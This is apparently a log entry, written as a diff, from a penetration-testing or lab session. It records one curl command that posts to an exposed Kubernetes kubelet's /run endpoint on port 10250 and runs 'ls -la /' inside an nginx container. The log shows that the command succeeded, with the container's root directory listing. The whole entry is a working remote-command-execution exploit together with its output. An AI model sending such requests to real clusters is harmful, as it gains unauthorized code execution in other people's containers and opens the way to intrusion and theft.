@@ -1,0 +1,33 @@
+### [2026-04-05 10:41:58] curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx -d cmd=ls -la /
+
+$ curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx -d cmd=ls -la /
+
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0100   1068 100   1056 100     12   9432    107                              0100   1068 100   1056 100     12   9428    107                              0100   1068 100   1056 100     12   9425    107                              0
+total 76
+drwxr-xr-x   1 root root 4096 Apr  4 12:37 .
+drwxr-xr-x   1 root root 4096 Apr  4 12:37 ..
+-rwxr-xr-x   1 root root    0 Apr  4 12:37 .dockerenv
+drwxr-xr-x   2 root root 4096 Mar 26  2019 bin
+drwxr-xr-x   2 root root 4096 Feb  3  2019 boot
+drwxr-xr-x   5 root root  360 Apr  4 12:37 dev
+drwxr-xr-x   1 root root 4096 Apr  4 12:37 etc
+drwxr-xr-x   2 root root 4096 Feb  3  2019 home
+drwxr-xr-x   1 root root 4096 Mar 26  2019 lib
+drwxr-xr-x   2 root root 4096 Mar 26  2019 lib64
+drwxr-xr-x   2 root root 4096 Mar 26  2019 media
+drwxr-xr-x   2 root root 4096 Mar 26  2019 mnt
+drwxr-xr-x   2 root root 4096 Mar 26  2019 opt
+dr-xr-xr-x 193 root root    0 Apr  4 12:37 proc
+drwxr-xr-x   2 root root 4096 Nov 30  2021 root
+drwxr-xr-x   1 root root 4096 Apr  4 12:37 run
+drwxr-xr-x   2 root root 4096 Mar 26  2019 sbin
+drwxr-xr-x   2 root root 4096 Mar 26  2019 srv
+dr-xr-xr-x  13 root root    0 Apr  5 01:10 sys
+drwxrwxrwt   1 root root 4096 Mar 26  2019 tmp
+drwxr-xr-x   1 root root 4096 Mar 26  2019 usr
+drwxr-xr-x   1 root root 4096 Mar 26  2019 var
+
+# Exit code: 0
+# Duration: 2026-04-05 10:41:58
